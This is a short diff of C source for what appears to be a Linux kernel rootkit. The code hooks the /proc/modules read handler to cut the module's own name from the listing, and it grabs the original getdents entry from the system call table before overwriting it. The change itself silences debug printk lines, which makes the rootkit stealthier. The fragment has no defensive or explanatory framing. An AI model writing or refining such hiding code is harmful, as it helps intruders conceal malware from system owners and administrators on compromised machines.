@@ -72,9 +72,9 @@ ssize_t custom_proc(struct file *fp, char __user *buff, size_t len, loff_t *offs
   char *remove_line_end = NULL;
   ssize_t ret = original_proc(fp, buff, len, offset);
   
-  printk(KERN_ALERT "Entered with ret: %ld", ret);
+  //printk(KERN_ALERT "Entered with ret: %ld", ret);
   remove_line = strnstr(buff, MODULE_NAME, ret);
-  printk(KERN_ALERT "Remove line %s\n", remove_line); 
+  //printk(KERN_ALERT "Remove line %s\n", remove_line); 
   if(NULL != remove_line) {
   	remove_line_end = remove_line;
         while(remove_line_end < (buff + ret)) {
@@ -101,7 +101,6 @@ int init_module(void) {
     
     //Get the number from /usr/include/asm/unistd_64.h
     original_getdents = (void *)p_sys_call_table[__NR_getdents];
-    printk(KERN_ALERT "Obtained original getdents\n"); 
  
     original_proc = proc_modules_operations->read;
     // we now overwrite the syscall
